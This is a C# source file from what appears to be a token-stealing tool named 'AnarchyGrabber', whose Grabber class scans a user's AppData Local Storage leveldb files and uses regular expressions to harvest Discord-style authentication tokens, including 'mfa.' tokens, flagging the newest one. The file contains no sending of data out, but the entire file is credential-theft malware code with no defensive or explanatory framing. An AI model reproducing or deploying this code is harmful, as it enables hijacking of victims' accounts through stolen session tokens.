using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using System.Linq;

namespace AnarchyGrabber
{
    public static class Grabber
    {
        public static bool TokensFound { get; private set; }


        public static List<string> GetTokens(string dir, bool checkLogs = false)
        {
            DirectoryInfo leveldb = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
                                                      + @"\AppData\"
                                                      + dir
                                                      + @"\Local Storage\leveldb");


            List<string> tokens = new List<string>();

            try
            {
                foreach (var file in leveldb.GetFiles(checkLogs ? "*.log" : "*.ldb"))
                {
                    string contents = file.OpenText().ReadToEnd();

                    //Get normal tokens
                    foreach (Match match in Regex.Matches(contents, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                        tokens.Add(match.Value);

                    //Get phone verified tokens
                    foreach (Match match in Regex.Matches(contents, @"mfa\.[\w-]{84}"))
                        tokens.Add(match.Value);
                }
            }
            catch { }

            tokens = tokens.Distinct().ToList();

            if (tokens.Count > 0)
            {
                TokensFound = true;
                tokens[tokens.Count - 1] += " - NEWEST";
            }
            else
                tokens.Add("No tokens found");

            return tokens;
        }
    }
}
